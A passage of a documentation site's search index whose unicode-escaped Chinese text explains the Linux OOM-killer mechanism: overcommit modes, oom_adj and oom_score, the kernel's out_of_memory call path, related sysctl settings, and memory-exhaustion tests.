u6e90\u53ef\u7528\u65f6\uff0cOOM\u673a\u5236\u5c31\u88ab\u89e6\u53d1\u4e86\u3002 Linux\u4e0b\u67093\u79cdOvercommit\u7b56\u7565\uff0c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/overcommit_memory\u914d\u7f6e\uff0c\u53d60\u30011\u548c2\u4e09\u4e2a\u503c\uff0c\u9ed8\u8ba4\u662f0\u3002 \u53d6\u503c0\uff1a\u5141\u8bb8\u5229\u7528\u7b97\u6cd5\u5408\u7406\u7684\u8fc7\u5ea6\u5206\u914d\uff1b \u53d6\u503c1\uff1a\u5141\u8bb8\u5206\u914d\u6bd4\u5f53\u524d\u5185\u5b58\u8d44\u6e90\u591a\u7684\u5185\u5b58\uff1b \u53d6\u503c2\uff1a\u7cfb\u7edf\u6240\u80fd\u5206\u914d\u7684\u5185\u5b58\u8d44\u6e90\u4e0d\u80fd\u8d85\u8fc7swap+\u5185\u5b58\u8d44\u6e90*\u7cfb\u6570(/proc/sys/vm/overcommit_ratio\uff0c\u9ed8\u8ba450%\uff0c\u53ef\u8c03\u6574)\u3002\u5982\u679c\u8d44\u6e90\u5df2\u7ecf\u7528\u5149\uff0c\u518d\u6709\u5185\u5b58\u7533\u8bf7\u8bf7\u6c42\u65f6\uff0c\u90fd\u4f1a\u8fd4\u56de\u9519\u8bef\u3002 OOM-Kill\u7b56\u7565 OOM-Killer\u7b56\u7565\u5c31\u662f\u8bf4\u5728\u53d1\u751fOOM\u65f6\uff0c\u4f1a\u9009\u62e9\u4e00\u4e9b\u8fdb\u7a0b\u6765\u6740\u6389\u4ee5\u91ca\u653e\u4e00\u90e8\u5206\u7f13\u5b58\u8d44\u6e90\u3002 Linux\u4e0b\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2aOOM\u6743\u91cd\uff0c\u5728/proc/ /oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 \u6700\u7ec8OOM-Killer\u662f\u901a\u8fc7 /proc/ /oom_score \u8fd9\u4e2a\u503c\u6765\u51b3\u5b9a\u54ea\u4e2a\u8fdb\u7a0b\u88ab\u6740\u6b7b\u3002\u8fd9\u4e2a\u503c\u662f\u7cfb\u7edf\u7efc\u5408\u8fdb\u7a0b\u7684\u5185\u5b58\u6d88\u8017\u91cf\u3001CPU\u65f6\u95f4(utime+stime)\u3001\u5b58\u6d3b\u65f6\u95f4(utime - start_time)\u548coom_adj\u8ba1\u7b97\u51fa\u7684\uff0c\u6d88\u8017\u5185\u5b58\u8d8a\u591aoom_score\u503c\u8d8a\u9ad8\uff0c\u5b58\u6d3b\u65f6\u95f4\u8d8a\u957f\u503c\u8d8a\u4f4e\u3002\u53e6\u5916\uff0cLinux\u5728\u8ba1\u7b97\u8fdb\u7a0b\u7684\u5185\u5b58\u6d88\u8017\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u5b50\u8fdb\u7a0b\u6240\u8017\u5185\u5b58\u7684\u4e00\u534a\u7b97\u5230\u7236\u8fdb\u7a0b\u4e2d(\u6709\u5174\u8da3\u7684\u8bdd\u53ef\u4ee5\u67e5\u770b\u5185\u6838\u4ee3\u7801mm/oom_kill.c\uff1abadness\u51fd\u6570)\u3002 \u603b\u4e4b\uff0cOOM-Killer\u7b56\u7565\u662f\uff1a\u635f\u5931\u6700\u5c11\u7684\u5de5\u4f5c\uff0c\u91ca\u653e\u6700\u5927\u7684\u5185\u5b58\uff1b\u540c\u65f6\u4e0d\u4f24\u53ca\u65e0\u8f9c\u7684\u7528\u4e86\u5f88\u5927\u5185\u5b58\u7684\u8fdb\u7a0b\uff0c\u5e76\u4e14\u6740\u6389\u7684\u8fdb\u7a0b\u6570\u5c3d\u91cf\u5c11\u3002 OOM\u673a\u5236\u5b9e\u73b0 \u5185\u6838\u5728\u89e6\u53d1OOM\u673a\u5236\u65f6\u4f1a\u8c03\u7528\u5230out_of_memory\u51fd\u6570\uff0c\u6b64\u51fd\u6570\u7684\u8c03\u7528\u987a\u5e8f\u5982\u4e0b\uff1a __alloc_pages |-->__alloc_pages_nodemask |--> __alloc_pages_slowpath |--> __alloc_pages_may_oom | --> out_of_memory \u4ee5\u4e0a\u51fd\u6570__alloc_pages_may_oom\u5728\u8c03\u7528\u4e4b\u524d\u4f1a\u5148\u5224\u65adoom_killer_disabled\u7684\u503c\uff0c\u5982\u679c\u6709\u503c\uff0c\u5219\u4e0d\u4f1a\u89e6\u53d1OOM\u673a\u5236\uff1b Bool\u578b\u53d8\u91cfoom_killer_disabled\u5b9a\u4e49\u5728\u6587\u4ef6mm/page_alloc.c\u4e2d\uff0c\u5e76\u6ca1\u6709\u63d0\u4f9b\u5916\u90e8\u63a5\u53e3\u66f4\u6539\u6b64\u503c\uff0c\u4f46\u662f\u5728\u5185\u6838\u4e2d\u6b64\u503c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u6253\u5f00OOM-kill\u3002 Linux\u4e2d\u5185\u5b58\u90fd\u662f\u4ee5\u9875\u7684\u5f62\u5f0f\u7ba1\u7406\u7684\uff0c\u6240\u4ee5\u4e0d\u7ba1\u662f\u600e\u4e48\u7533\u8bf7\u5185\u5b58\uff0c\u90fd\u4f1a\u8c03\u7528alloc_page\u51fd\u6570\uff0c\u6700\u7ec8\u8c03\u7528\u5230\u51fd\u6570out_of_memory\uff0c\u89e6\u53d1OOM\u673a\u5236\u3002 \u4e0b\u9762\u7b80\u8981\u8bf4\u660e\u51fd\u6570 out_of_memory \u6d41\u7a0b\u3002 \u51fd\u6570 out_of_memory \u5224\u65ad\u5168\u5c40\u53d8\u91cfsysctl_panic_on_oom==2\uff0c\u6210\u7acb\u5219\u76f4\u63a5panic \u83b7\u53d6/proc/sys/vm/overcommit_memory\u4e2d\u7684\u914d\u7f6e\u7684\u503c\uff1a a) \u4e3a2\uff1a\u76f4\u63a5\u5c06\u5f53\u524d\u8fdb\u7a0b\u6740\u6b7b\uff1b b) \u4e3a0\uff1a\u5224\u65adsysctl_panic_on_oom\u662f\u5426\u6709\u503c\uff0c\u6709\u503c\u76f4\u63a5panic\uff0c\u5426\u5219\u8c03\u7528 __out_of_memory\u51fd\u6570 \uff1b c) \u4e3a1\uff1a\u8c03\u7528__out_of_memory\u51fd\u6570 __out_of_memory \u51fd\u6570\uff0c\u5176\u6d41\u7a0b\u5982\u4e0b\uff1a \u4ee5\u4e0a\u6d41\u7a0b\u4e2d\u503c\u5f97\u5173\u6ce8\u7684\u5730\u65b9\u6709\uff1a \u53d8\u91cfsysctl_panic_on_oom\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/panic_on_oom\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u4e3a0\uff1b \u53d8\u91cfsysctl_oom_kill_allocating_task\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/oom_kill_allocating_task\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u4e3a0\uff1b \u5f53\u5185\u5b58\u8d44\u6e90\u7d27\u5f20\uff0c\u540c\u65f6\u4e5f\u6ca1\u6709\u53ef\u4ee5\u6740\u6b7b\u7684\u8fdb\u7a0b\u65f6\uff0c\u7cfb\u7edf\u4f1apanic\uff1b \u6740\u6b7b\u8fdb\u7a0b\u9700\u8981\u8c03\u7528\u51fd\u6570oom_kill_process\uff0c\u6b64\u51fd\u6570\u6838\u5fc3\u6b65\u9aa4\u5c31\u662f\u5148\u6740\u6b7b\u6307\u5b9a\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0bp->children\uff0c\u7136\u540e\u6740\u6b7b\u6307\u5b9a\u8fdb\u7a0bp\uff0c\u5177\u4f53\u6740\u6b7b\u8fdb\u7a0b\u7684\u51fd\u6570\u4e3aoom_kill_task\u3002 \u4e0b\u9762\u7b80\u8981\u8bf4\u660e\u51fd\u6570 oom_kill_task \u51fd\u6570 oom_kill_task \u6b64\u51fd\u6570\u6d41\u7a0b\u5982\u4e0b\uff1a \u4ee5\u4e0a\u6d41\u7a0b\u4e2d\u503c\u5f97\u5173\u6ce8\u7684\u5730\u65b9\u6709\uff1a p->signal->oom_adj\u7684\u503c\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/ /oom_adj\u8bbe\u7f6e\uff1b \u53d8\u91cfsysctl_would_have_oomkilled\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/would_have_oomkilled\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u4e3a0\u3002 \u603b\u7ed3 \u901a\u8fc7\u524d\u9762\u4ecb\u7ecd\uff0c\u53ef\u4ee5\u770b\u5230Linux\u4e2dOOM\u673a\u5236\u662f\u5426\u4f1a\u89e6\u53d1\uff0c\u4e0e\u4ee5\u4e0b\u51e0\u4e2a\u53d8\u91cf\u6709\u5173\uff1a 1. oom_killer_disabled\uff1a\u6b64\u503c\u867d\u7136\u6ca1\u6709\u63d0\u4f9b\u5916\u90e8\u63a5\u53e3\u66f4\u6539\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u7ed9\u5185\u6838\u6253patch\uff0c\u589e\u52a0\u4e00\u4e2a\u5916\u90e8\u63a5\u53e3\uff0c\u4f7f\u6b64\u503c\u53ef\u52a8\u6001\u6539\u53d8 2. sysctl_panic_on_oom\uff1a\u6b64\u503c\u4e00\u822c\u4e0d\u5efa\u8bae\u8bbe\u7f6e\uff0c\u56e0\u4e3a\u5982\u679c\u7533\u8bf7\u4e0d\u5230\u5185\u5b58\uff0c\u7cfb\u7edf\u5c31panic\u4e86\uff1b 3. sysctl_oom_kill_allocating_task\uff1a\u6b64\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u7c7b\u4f3c\u7ed9\u63a5\u53e3/proc/sys/vm/overcommit_memory\uff0c\u8bbe\u7f6e\u503c\u4e3a2\uff0c\u88ab\u8bbe\u7f6e\u540e\uff0c\u67d0\u4e2a\u8fdb\u7a0b\u8981\u7533\u8bf7\u5185\u5b58\u5931\u8d25\u65f6\u76f4\u63a5\u5c06\u8be5\u8fdb\u7a0b\u6740\u6b7b\uff1b 4. sysctl_would_have_oomkilled\uff1a\u6b64\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u4e5f\u4e0d\u4f1a\u771f\u6b63\u7684\u53bb\u6740\u6b7b\u8fdb\u7a0b 5. p->signal->oom_adj\uff1a\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7\u63a5\u53e3/proc/ /oom_adj\u8bbe\u7f6e\u503c\u4e3a-17\uff0c\u8868\u793a\u8be5\u8fdb\u7a0b\u4e0d\u53ef\u88ab\u6740\u6b7b\u3002 OOM\u673a\u5236\u7684\u51e0\u7ec4\u6d4b\u8bd5 \u6d4b\u8bd51 \u6253\u5f00OOM\u673a\u5236\uff08\u9ed8\u8ba4\uff09 \u7269\u7406\u673a\u5668\u914d\u7f6e\uff1a2G\u5185\u5b58\uff0c\u65e0swap\u5206\u533a \u6267\u884c\u547d\u4ee4\uff1a20\u4e2adepmod -a\u547d\u4ee4 \u7ed3\u679c\uff1a \u673a\u5668\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\uff0c\u53ef\u4ee5\u770b\u5230/var/log/message\u4e2d\u51fa\u73b0out of memory\uff1a kill process\u4fe1\u606f\uff1b \u5f53\u65e0\u8fdb\u7a0b\u53ef\u6740\u65f6\uff0c\u673a\u5668panic\u3002 \u6d4b\u8bd52 \u5173\u95edOOM\u673a\u5236 \u901a\u8fc7\u7ed9\u5185\u6838\u6253patch\uff0c\u5c06oom_killer_disabled\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u53e6\u5916\u901a\u8fc7sys\u63a5\u53e3\u5c06sysctl_would_have_oomkilled\u503c\u8bbe\u7f6e\u4e3a1\u3002 1. \u6709swap\u5206\u533a\u65f6 \u7269\u7406\u673a\u5668\u914d\u7f6e\uff1a2G\u5185\u5b58\uff0c2G\u5927\u5c0fswap\u5206\u533a \u6267\u884c\u547d\u4ee4\uff1a20\u4e2adepmod -a\u547d\u4ee4 \u7ed3\u679c\uff1a a) \u673a\u5668\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\uff0c/var/log/message\u4e2d\u4e0d\u51fa\u73b0out of memory\uff1a kill process * \u5b57\u6837 b) free -m -s 1\u547d\u4ee4\u89c2\u5bdf\u5f53\u524d\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5185\u5b58\u4f7f\u7528\u5b8c\u6bd5\u540e\uff0c\u5f00\u59cb\u4f7f\u7528swap\u5206\u533a\uff0c\u5f53swap\u5206\u533a\u4f7f\u7528\u5b8c\u540e\uff0c\u7cfb\u7edf\u4f1a\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u91ca\u653e\u51fa\u4e00\u6bb5swap\u5206\u533a\u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u673a\u5668\u5f88\u5361\u3002 \u65e0swap\u5206\u533a\u65f6 \u7269\u7406\u673a\u5668\u914d\u7f6e\uff1a2G\u5185\u5b58\uff0c\u65e0swap\u5206\u533a \u6267\u884c\u547d\u4ee4\uff1a20\u4e2adepmod -a\u547d\u4ee4 \u7ed3\u679c\uff1a a) \u673a\u5668\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\uff0c/var/log/message\u4e2d\u4e0d\u51fa\u73b0out of memory\uff1a kill process * \u5b57\u6837\uff1b b) free -m -s 1\u547d\u4ee4\u89c2\u5bdf\u5f53\u524d\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5185\u5b58\u4f7f\u7528\u5b8c\u6bd5\u540e\uff0c\u673a\u5668\u5f88\u5361\uff0c\u65e0\u6cd5\u64cd\u4f5c \uff0c\u4f46\u662f\u53ef\u4ee5ping\u901a\u3002 \u6d4b\u8bd5\u7ed3\u679c\u5206\u6790 \u5173\u95edOOM\u673a\u5236\uff0c\u867d\u7136\u4e0d\u4f1a\u51fa\u73b0\u6740\u8fdb\u7a0b\u7684\u73b0\u8c61\uff0c\u4f46\u662f\u5e94\u7528\u7a0b\u5e8f\u5728\u7533\u8bf7\u5185\u5b58\u8d44\u6e90\u65f6\u7531\u4e8e\u5185\u5b58\u8d44\u6e90\u7d27\u5f20\u5bfc\u81f4\u7533\u8bf7\u4e0d\u5230\u8d44\u6e90\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u4e00\u76f4\u5faa\u73af\u7533\u8bf7\u5185\u5b58\uff0c\u76f4\u5230\u7533\u8bf7\u5230\u4e3a\u6b62\uff0c\u5728\u672a\u7533\u8bf7\u5230\u5185\u5b58\u8d44\u6e90\u4e4b\u524d\uff0c\u4f1a\u4e00\u76f4\u5360\u7528\u67d0\u4e2aCPU\u4e0d\u653e\uff0c\u5bfc\u81f4\u673a\u5668\u5361\u4f4f\u3002 \u4ece\u6d4b\u8bd5\u4e2d\u53ef\u4ee5\u770b\u5230\uff0cswap\u5206\u533a\u80fd\u591f\u7f13\u89e3\u4e00\u4e0b\u5185\u5b58\u7d27\u5f20\u7684\u60c5\u51b5\uff0c\u5982\u679c\u80fd\u591f\u5229\u7528\u597dswap\u5206\u533a\uff0c\u5e76\u4e14\u5e94\u7528\u7a0b\u5e8f\u4e0d\u4f1a\u51fa\u73b0\u5185\u5b58\u6cc4\u6f0f\u7b49\u95ee\u9898\u65f6\uff0c\u53ef\u4ee5\u7f13\u89e3\u5185\u5b58\u7d27\u5f20\u7684\u60c5\u51b5\uff0c\u4f46\u8fd8\u662f\u4e0d\u80fd\u907f\u514d\u673a\u5668\u5361\u4f4f\u7684\u73b0\u8c61\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5f53\u673a\u5668\u5361\u4f4f\u65f6\uff0c\u6027\u80fd\u5df2\u7ecf\u65e0\u6cd5\u4fdd\u8bc1\u3002","title":"oom\u673a\u5236"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E6%9C%BA%E5%88%B6/#linux-oom","text":"OOM(Out Of Memory)\u673a\u5236\u4e3aLinux\u5185\u6838\u4e2d\u4e00\u79cd\u81ea\u6211\u4fdd\u62a4\u673a\u5236\uff0c\u5f53\u7cfb\u7edf\u5206\u914d\u4e0d\u51fa\u5185\u5b58\u65f6(\u89e6\u53d1\u6761\u4ef6)\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u673a\u5236\uff0c\u7531\u7cfb\u7edf\u5728\u5df2\u6709\u8fdb\u7a0b\u4e2d\u6311\u9009\u4e00\u4e2a\u5360\u7528\u5185\u5b58\u8f83\u591a\uff0c\u56de\u6536\u5185\u5b58\u6536\u76ca\u6700\u5927\u7684\u8fdb\u7a0b\u6740\u6389\u6765\u91ca\u653e\u5185\u5b58\u3002 Linux\u4e0b\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u6bd4\u7cfb\u7edf\u53ef\u7528\u5185\u5b58\u66f4\u591a\u7684\u5185\u5b58(\u5982malloc\u51fd\u6570)\uff0c\u8fd9\u4e2a\u7279\u6027\u53ebOvercommit\u3002\u8fd9\u4e48\u505a\u662f\u51fa\u4e8e\u4f18\u5316\u7cfb\u7edf\u7684\u8003\u8651\uff0c\u56e0\u4e3a\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u7533\u8bf7\u4e86\u5185\u5b58\u5c31\u7acb\u523b\u4f7f\u7528\uff0c\u5f53\u4f7f\u7528\u7684\u65f6\u5019\u8bf4\u4e0d\u5b9a\u7cfb\u7edf\u5df2\u7ecf\u56de\u6536\u4e86\u4e00\u4e9b\u5185\u5b58\u8d44\u6e90\u4e86\u3002\u4e0d\u8fc7\u5f53\u9700\u8981\u771f\u6b63\u4f7f\u7528\u5185\u5b58\u8d44\u6e90\u800c\u7cfb\u7edf\u5df2\u7ecf\u6ca1\u6709\u591a\u4f59\u7684\u5185\u5b58\u8d44\u6e90\u53ef\u7528\u65f6\uff0cOOM\u673a\u5236\u5c31\u88ab\u89e6\u53d1\u4e86\u3002 Linux\u4e0b\u67093\u79cdOvercommit\u7b56\u7565\uff0c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/overcommit_memory\u914d\u7f6e\uff0c\u53d60\u30011\u548c2\u4e09\u4e2a\u503c\uff0c\u9ed8\u8ba4\u662f0\u3002 \u53d6\u503c0\uff1a\u5141\u8bb8\u5229\u7528\u7b97\u6cd5\u5408\u7406\u7684\u8fc7\u5ea6\u5206\u914d\uff1b \u53d6\u503c1\uff1a\u5141\u8bb8\u5206\u914d\u6bd4\u5f53\u524d\u5185\u5b58\u8d44\u6e90\u591a\u7684\u5185\u5b58\uff1b \u53d6\u503c2\uff1a\u7cfb\u7edf\u6240\u80fd\u5206\u914d\u7684\u5185\u5b58\u8d44\u6e90\u4e0d\u80fd\u8d85\u8fc7swap+\u5185\u5b58\u8d44\u6e90*\u7cfb\u6570(/proc/sys/vm/overcommit_ratio\uff0c\u9ed8\u8ba450%\uff0c\u53ef\u8c03\u6574)\u3002\u5982\u679c\u8d44\u6e90\u5df2\u7ecf\u7528\u5149\uff0c\u518d\u6709\u5185\u5b58\u7533\u8bf7\u8bf7\u6c42\u65f6\uff0c\u90fd\u4f1a\u8fd4\u56de\u9519\u8bef\u3002","title":"Linux OOM\u673a\u5236"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E6%9C%BA%E5%88%B6/#oom-kill","text":"OOM-Killer\u7b56\u7565\u5c31\u662f\u8bf4\u5728\u53d1\u751fOOM\u65f6\uff0c\u4f1a\u9009\u62e9\u4e00\u4e9b\u8fdb\u7a0b\u6765\u6740\u6389\u4ee5\u91ca\u653e\u4e00\u90e8\u5206\u7f13\u5b58\u8d44\u6e90\u3002 Linux\u4e0b\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2aOOM\u6743\u91cd\uff0c\u5728/proc/ /oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 \u6700\u7ec8OOM-Killer\u662f\u901a\u8fc7 /proc/ /oom_score \u8fd9\u4e2a\u503c\u6765\u51b3\u5b9a\u54ea\u4e2a\u8fdb\u7a0b\u88ab\u6740\u6b7b\u3002\u8fd9\u4e2a\u503c\u662f\u7cfb\u7edf\u7efc\u5408\u8fdb\u7a0b\u7684\u5185\u5b58\u6d88\u8017\u91cf\u3001CPU\u65f6\u95f4(utime+stime)\u3001\u5b58\u6d3b\u65f6\u95f4(utime - start_time)\u548coom_adj\u8ba1\u7b97\u51fa\u7684\uff0c\u6d88\u8017\u5185\u5b58\u8d8a\u591aoom_score\u503c\u8d8a\u9ad8\uff0c\u5b58\u6d3b\u65f6\u95f4\u8d8a\u957f\u503c\u8d8a\u4f4e\u3002\u53e6\u5916\uff0cLinux\u5728\u8ba1\u7b97\u8fdb\u7a0b\u7684\u5185\u5b58\u6d88\u8017\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u5b50\u8fdb\u7a0b\u6240\u8017\u5185\u5b58\u7684\u4e00\u534a\u7b97\u5230\u7236\u8fdb\u7a0b\u4e2d(\u6709\u5174\u8da3\u7684\u8bdd\u53ef\u4ee5\u67e5\u770b\u5185\u6838\u4ee3\u7801mm/oom_kill.c\uff1abadness\u51fd\u6570)\u3002 \u603b\u4e4b\uff0cOOM-Killer\u7b56\u7565\u662f\uff1a\u635f\u5931\u6700\u5c11\u7684\u5de5\u4f5c\uff0c\u91ca\u653e\u6700\u5927\u7684\u5185\u5b58\uff1b\u540c\u65f6\u4e0d\u4f24\u53ca\u65e0\u8f9c\u7684\u7528\u4e86\u5f88\u5927\u5185\u5b58\u7684\u8fdb\u7a0b\uff0c\u5e76\u4e14\u6740\u6389\u7684\u8fdb\u7a0b\u6570\u5c3d\u91cf\u5c11\u3002","title":"OOM-Kill\u7b56\u7565"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E6%9C%BA%E5%88%B6/#oom","text":"\u5185\u6838\u5728\u89e6\u53d1OOM\u673a\u5236\u65f6\u4f1a\u8c03\u7528\u5230out_of_memory\u51fd\u6570\uff0c\u6b64\u51fd\u6570\u7684\u8c03\u7528\u987a\u5e8f\u5982\u4e0b\uff1a __alloc_pages |-->__alloc_pages_nodemask |--> __alloc_pages_slowpath |--> __alloc_pages_may_oom | --> out_of_memory \u4ee5\u4e0a\u51fd\u6570__alloc_pages_may_oom\u5728\u8c03\u7528\u4e4b\u524d\u4f1a\u5148\u5224\u65adoom_killer_disabled\u7684\u503c\uff0c\u5982\u679c\u6709\u503c\uff0c\u5219\u4e0d\u4f1a\u89e6\u53d1OOM\u673a\u5236\uff1b Bool\u578b\u53d8\u91cfoom_killer_disabled\u5b9a\u4e49\u5728\u6587\u4ef6mm/page_alloc.c\u4e2d\uff0c\u5e76\u6ca1\u6709\u63d0\u4f9b\u5916\u90e8\u63a5\u53e3\u66f4\u6539\u6b64\u503c\uff0c\u4f46\u662f\u5728\u5185\u6838\u4e2d\u6b64\u503c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u6253\u5f00OOM-kill\u3002 Linux\u4e2d\u5185\u5b58\u90fd\u662f\u4ee5\u9875\u7684\u5f62\u5f0f\u7ba1\u7406\u7684\uff0c\u6240\u4ee5\u4e0d\u7ba1\u662f\u600e\u4e48\u7533\u8bf7\u5185\u5b58\uff0c\u90fd\u4f1a\u8c03\u7528alloc_page\u51fd\u6570\uff0c\u6700\u7ec8\u8c03\u7528\u5230\u51fd\u6570out_of_memory\uff0c\u89e6\u53d1OOM\u673a\u5236\u3002 \u4e0b\u9762\u7b80\u8981\u8bf4\u660e\u51fd\u6570 out_of_memory \u6d41\u7a0b\u3002 \u51fd\u6570 out_of_memory \u5224\u65ad\u5168\u5c40\u53d8\u91cfsysctl_panic_on_oom==2\uff0c\u6210\u7acb\u5219\u76f4\u63a5panic \u83b7\u53d6/proc/sys/vm/overcommit_memory\u4e2d\u7684\u914d\u7f6e\u7684\u503c\uff1a a) \u4e3a2\uff1a\u76f4\u63a5\u5c06\u5f53\u524d\u8fdb\u7a0b\u6740\u6b7b\uff1b b) \u4e3a0\uff1a\u5224\u65adsysctl_panic_on_oom\u662f\u5426\u6709\u503c\uff0c\u6709\u503c\u76f4\u63a5panic\uff0c\u5426\u5219\u8c03\u7528 __out_of_memory\u51fd\u6570 \uff1b c) \u4e3a1\uff1a\u8c03\u7528__out_of_memory\u51fd\u6570 __out_of_memory \u51fd\u6570\uff0c\u5176\u6d41\u7a0b\u5982\u4e0b\uff1a \u4ee5\u4e0a\u6d41\u7a0b\u4e2d\u503c\u5f97\u5173\u6ce8\u7684\u5730\u65b9\u6709\uff1a \u53d8\u91cfsysctl_panic_on_oom\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/panic_on_oom\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u4e3a0\uff1b \u53d8\u91cfsysctl_oom_kill_allocating_task\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/oom_kill_allocating_task\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u4e3a0\uff1b \u5f53\u5185\u5b58\u8d44\u6e90\u7d27\u5f20\uff0c\u540c\u65f6\u4e5f\u6ca1\u6709\u53ef\u4ee5\u6740\u6b7b\u7684\u8fdb\u7a0b\u65f6\uff0c\u7cfb\u7edf\u4f1apanic\uff1b \u6740\u6b7b\u8fdb\u7a0b\u9700\u8981\u8c03\u7528\u51fd\u6570oom_kill_process\uff0c\u6b64\u51fd\u6570\u6838\u5fc3\u6b65\u9aa4\u5c31\u662f\u5148\u6740\u6b7b\u6307\u5b9a\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0bp->children\uff0c\u7136\u540e\u6740\u6b7b\u6307\u5b9a\u8fdb\u7a0bp\uff0c\u5177\u4f53\u6740\u6b7b\u8fdb\u7a0b\u7684\u51fd\u6570\u4e3aoom_kill_task\u3002 \u4e0b\u9762\u7b80\u8981\u8bf4\u660e\u51fd\u6570 oom_kill_task \u51fd\u6570 oom_kill_task \u6b64\u51fd\u6570\u6d41\u7a0b\u5982\u4e0b\uff1a \u4ee5\u4e0a\u6d41\u7a0b\u4e2d\u503c\u5f97\u5173\u6ce8\u7684\u5730\u65b9\u6709\uff1a p->signal->oom_adj\u7684\u503c\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/ /oom_adj\u8bbe\u7f6e\uff1b \u53d8\u91cfsysctl_would_have_oomkilled\uff0c\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/would_have_oomkilled\u8bbe\u7f6e\uff0c\u9ed8\u8ba4\u4e3a0\u3002 \u603b\u7ed3 \u901a\u8fc7\u524d\u9762\u4ecb\u7ecd\uff0c\u53ef\u4ee5\u770b\u5230Linux\u4e2dOOM\u673a\u5236\u662f\u5426\u4f1a\u89e6\u53d1\uff0c\u4e0e\u4ee5\u4e0b\u51e0\u4e2a\u53d8\u91cf\u6709\u5173\uff1a 1. oom_killer_disabled\uff1a\u6b64\u503c\u867d\u7136\u6ca1\u6709\u63d0\u4f9b\u5916\u90e8\u63a5\u53e3\u66f4\u6539\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u7ed9\u5185\u6838\u6253patch\uff0c\u589e\u52a0\u4e00\u4e2a\u5916\u90e8\u63a5\u53e3\uff0c\u4f7f\u6b64\u503c\u53ef\u52a8\u6001\u6539\u53d8 2. sysctl_panic_on_oom\uff1a\u6b64\u503c\u4e00\u822c\u4e0d\u5efa\u8bae\u8bbe\u7f6e\uff0c\u56e0\u4e3a\u5982\u679c\u7533\u8bf7\u4e0d\u5230\u5185\u5b58\uff0c\u7cfb\u7edf\u5c31panic\u4e86\uff1b 3. sysctl_oom_kill_allocating_task\uff1a\u6b64\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u7c7b\u4f3c\u7ed9\u63a5\u53e3/proc/sys/vm/overcommit_memory\uff0c\u8bbe\u7f6e\u503c\u4e3a2\uff0c\u88ab\u8bbe\u7f6e\u540e\uff0c\u67d0\u4e2a\u8fdb\u7a0b\u8981\u7533\u8bf7\u5185\u5b58\u5931\u8d25\u65f6\u76f4\u63a5\u5c06\u8be5\u8fdb\u7a0b\u6740\u6b7b\uff1b 4. sysctl_would_have_oomkilled\uff1a\u6b64\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u4e5f\u4e0d\u4f1a\u771f\u6b63\u7684\u53bb\u6740\u6b7b\u8fdb\u7a0b 5. p->signal->oom_adj\uff1a\u6b64\u503c\u53ef\u4ee5\u901a\u8fc7\u63a5\u53e3/proc/ 